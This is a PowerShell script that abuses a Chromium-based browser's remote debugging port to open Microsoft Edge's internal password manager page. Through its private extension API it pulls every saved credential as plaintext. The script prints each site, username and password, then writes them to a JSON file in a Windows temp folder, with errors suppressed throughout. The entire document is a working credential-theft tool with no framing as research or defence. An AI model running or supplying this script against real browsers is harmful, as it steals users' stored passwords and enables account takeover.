$ErrorActionPreference = 'SilentlyContinue'

# Connect to browser WebSocket
$ver = (curl.exe -s http://127.0.0.1:9222/json/version | ConvertFrom-Json)
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$ver.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0
$script:sid = ""

function Read-Msg {
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

function Send-Recv {
    param([hashtable]$msg)
    $script:mid++
    $msg.id = $script:mid
    if ($script:sid) { $msg.sessionId = $script:sid }
    $j = ConvertTo-Json -Compress -InputObject $msg -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    return Read-Msg
}

function Send-Eval {
    param([string]$js)
    return Send-Recv @{ method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
}

# ═══ 1. Create target ═══
Write-Output "[1] creating edge://password-manager target..."
$createMsg = @{ method = "Target.createTarget"; params = @{ url = "edge://password-manager" } }
$createResp = Send-Recv $createMsg
$createObj = $createResp | ConvertFrom-Json
$targetId = $createObj.result.targetId
Write-Output "    targetId: $targetId"
Start-Sleep 10

# ═══ 2. Attach and get sessionId from EVENT ═══
Write-Output "[2] attaching..."
$attachMsg = @{ method = "Target.attachToTarget"; params = @{ targetId = $targetId; flatten = $true } }

# Send attach command
$script:mid++
$attachMsg.id = $script:mid
$attachJ = ConvertTo-Json -Compress -InputObject $attachMsg -Depth 5
$attachB = [System.Text.Encoding]::UTF8.GetBytes($attachJ)
$attachS = [ArraySegment[byte]]::new($attachB)
$ws.SendAsync($attachS, 'Text', $true, $ct).Wait()

# Read messages until we get the attachedToTarget event
$maxReads = 10
for ($i = 0; $i -lt $maxReads; $i++) {
    $msg = Read-Msg
    Write-Output "    msg[$i]: $($msg.Substring(0, [Math]::Min(200, $msg.Length)))"
    if ($msg.Contains("Target.attachedToTarget")) {
        $eventObj = $msg | ConvertFrom-Json
        $script:sid = $eventObj.params.sessionId
        Write-Output "    GOT SESSION: $script:sid"
        break
    }
    if ($msg.Contains("`"id`":$script:mid")) {
        Write-Output "    got command response"
        break
    }
}

if (-not $script:sid) {
    Write-Output "[-] no sessionId"
    $ws.Dispose()
    exit
}

# ═══ 3. Enable Runtime in the session ═══
Write-Output "[3] enabling Runtime..."
$enableResp = Send-Recv @{ method = "Runtime.enable" }
Write-Output "    $enableResp"

# ═══ 4. Verify page URL ═══
Write-Output "[4] checking URL..."
$urlResp = Send-Eval 'window.location.href'
$urlObj = $urlResp | ConvertFrom-Json
$pageUrl = $urlObj.result.result.value
Write-Output "    URL: $pageUrl"

# ═══ 5. Check API availability ═══
$apiResp = Send-Eval 'JSON.stringify({pm: !!chrome.passwordsManagerPrivate, pp: !!chrome.passwordsPrivate, url: location.href})'
$apiObj = $apiResp | ConvertFrom-Json
Write-Output "    APIs: $($apiObj.result.result.value)"

# ═══ 6. Get password list ═══
Write-Output "[5] getting passwords..."
$listResp = Send-Eval @'
new Promise(async (resolve) => {
    try {
        const api = chrome.passwordsManagerPrivate;
        if (!api) { resolve(JSON.stringify({error: "no api"})); return; }
        api.getSavedPasswordList(function(entries) {
            if (chrome.runtime.lastError) {
                resolve(JSON.stringify({error: chrome.runtime.lastError.message}));
            } else {
                resolve(JSON.stringify({count: (entries||[]).length, data: entries||[]}));
            }
        });
    } catch(e) {
        resolve(JSON.stringify({error: e.message}));
    }
})
'@
$listObj = $listResp | ConvertFrom-Json
$listVal = $listObj.result.result.value
Write-Output "    list: $($listVal.Substring(0, [Math]::Min(500, [string]$listVal)))"

if (-not $listVal) {
    Write-Output "    empty, trying promise..."
    $listResp2 = Send-Eval 'chrome.passwordsManagerPrivate.getSavedPasswordList().then(l => JSON.stringify({count: l.length, data: l}))'
    $listObj2 = $listResp2 | ConvertFrom-Json
    $listVal = $listObj2.result.result.value
    Write-Output "    promise: $($listVal.Substring(0, [Math]::Min(500, [string]$listVal)))"
}

if ($listVal -and $listVal.Contains('"count"')) {
    $listData = $listVal | ConvertFrom-Json
    $passwords = $listData.data
    Write-Output "[+] $($listData.count) passwords!"

    # ═══ 7. Extract each password ═══
    $results = [System.Collections.ArrayList]::new()

    for ($i = 0; $i -lt $passwords.Count; $i++) {
        $entry = $passwords[$i]
        $eid = $entry.id
        $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } else { "unknown" }
        $euser = $entry.username

        Write-Output "[*] [$($i+1)/$($passwords.Count)] $eurl ($euser)..."

        $getJs = @"
new Promise(async (resolve) => {
    try {
        const api = chrome.passwordsManagerPrivate;
        api.requestPlaintextPassword($eid, 0, function(pw) {
            if (chrome.runtime.lastError) {
                resolve(JSON.stringify({err: chrome.runtime.lastError.message}));
            } else {
                resolve(JSON.stringify({p: pw}));
            }
        });
    } catch(e) {
        resolve(JSON.stringify({err: e.message}));
    }
})
"@
        $getResp = Send-Eval $getJs
        $getObj = $getResp | ConvertFrom-Json
        $getVal = $getObj.result.result.value

        if ($getVal) {
            $pwData = $getVal | ConvertFrom-Json
            if ($pwData.p -ne $null -and $pwData.p -ne "") {
                [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password=$pwData.p})
                Write-Output "    PASSWORD: $($pwData.p)"
            } elseif ($pwData.err) {
                Write-Output "    err: $($pwData.err)"
                [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password="<blocked>"})
            }
        }
    }

    # Output
    Write-Output ""
    Write-Output "================================================================"
    foreach ($r in $results) {
        Write-Output "  $($r.url) | $($r.username) | $($r.password)"
    }

    $results | ConvertTo-Json -Depth 3 | Out-File "C:\Windows\Temp\ziti\pwd_extracted.json" -Encoding utf8
    Write-Output "[+] saved to pwd_extracted.json"
} else {
    Write-Output "[-] could not get password list"
    Write-Output "    full: $listResp"
}

$ws.Dispose()
Write-Output "[+] done"